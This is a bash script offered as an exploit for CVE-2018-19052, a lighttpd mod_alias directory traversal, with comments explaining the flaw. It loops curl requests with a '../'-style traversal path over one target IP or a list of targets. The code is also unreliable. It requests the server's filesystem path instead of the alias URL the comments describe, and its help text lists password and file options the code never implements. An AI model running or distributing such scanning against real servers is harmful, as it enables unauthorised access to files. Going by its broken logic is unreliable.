#!/usr/bin/env bash

# [mod_alias] security: potential path traversal with specific configs
# Security: potential path traversal of a single directory above the alias
# target with a specific mod_alias config where the alias which is matched
# does not end in '/', but alias target filesystem path does end in '/'.

# e.g. server.docroot = "/srv/www/host/HOSTNAME/docroot"
#      alias.url = ( "/img" => "/srv/www/hosts/HOSTNAME/images/" )

# If a malicious URL "/img../" were passed, the request would be
# for directory "/srv/www/hosts/HOSTNAME/images/../" which would resolve
# to "/srv/www/hosts/HOSTNAME/".  If mod_dirlisting were enabled, which
# is not the default, this would result in listing the contents of the
# directory above the alias.  An attacker might also try to directly
# access files anywhere under that path, which is one level above the
# intended aliased path.

# CVE credit: Orange Tsai(@orange_8361) from DEVCORE
# Script by 1vere$k

REGIME=$1
IP=$2

# Checking if we have a target to attack
if [ -z "$IP" ];then
	REGIME="-h"
fi

# Small standart how-to.
if [ -z "$REGIME" ] || [ "$REGIME" == "-h" ] || [ $REGIME == "--help" ];then
	echo "-------------------Welcome-to-CVE-2018-19052-by-1veresk----------------+";
	echo "+----------------------------------------------------------------------+";
	echo "+-------------------For-The-Help---------------------------------------+";
	echo "Example#1: ./cve-2018-19052.sh -h--------------------------------------+";
	echo "Example#2: ./cve-2018-19052.sh --help----------------------------------+";
	echo "+-------------------For-The-URL-Check----------------------------------+";
	echo "Example#1: ./cve-2018-19052.sh -u <IP> <PASSWORD> [Default is 'readonly'";
	echo "+-------------------For-The-File-Check---------------------------------+";
	echo "Example#1: ./cve-2018-19052.sh -f <FILENAME>-<PASSFILE>----------------+";
	echo "+----------------------------------------------------------------------+";
	exit 1;
fi

# Attacking Target
if [ -e "$IP" ];then
	while read LINE; do
		echo "Output for the $LINE is:"
		curl --max-time 10 "http://$LINE/srv/www/hosts/HOSTNAME/images../"
		sleep 1
	done <$IP
else
	echo "Output for the $IP is:"
	curl --max-time 10 "http://$IP/srv/www/hosts/HOSTNAME/images../"
	sleep 1
fi